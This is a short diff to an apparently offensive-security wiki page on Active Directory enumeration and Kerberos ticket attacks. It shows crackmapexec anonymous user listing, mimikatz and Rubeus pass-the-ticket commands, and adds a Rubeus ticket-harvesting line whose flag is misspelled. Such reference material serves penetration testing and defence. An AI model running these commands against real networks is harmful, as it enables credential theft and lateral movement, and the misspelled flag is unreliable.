@@ -256,6 +256,8 @@ msf> use auxiliary/gather/kerberos_enumusers
 crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
 ```
 
+
+
 ## Enumerating Active Directory WITH credentials/session
 
 {% code overflow="wrap" %}
@@ -324,10 +326,11 @@ mimikatz # kerberos::ptt <ticket_kirbi_file>
 
 {% embed url="https://github.com/gentilkiwi/mimikatz" %}
 
-* Rubeus
+### Rubeus
 
 ```powershell
 Rubeus.exe ptt /ticket:<ticket_kirbi_file>
+.\Rubeus.exe harvest /intercal:30
 ```
 
 {% embed url="https://github.com/GhostPack/Rubeus" %}
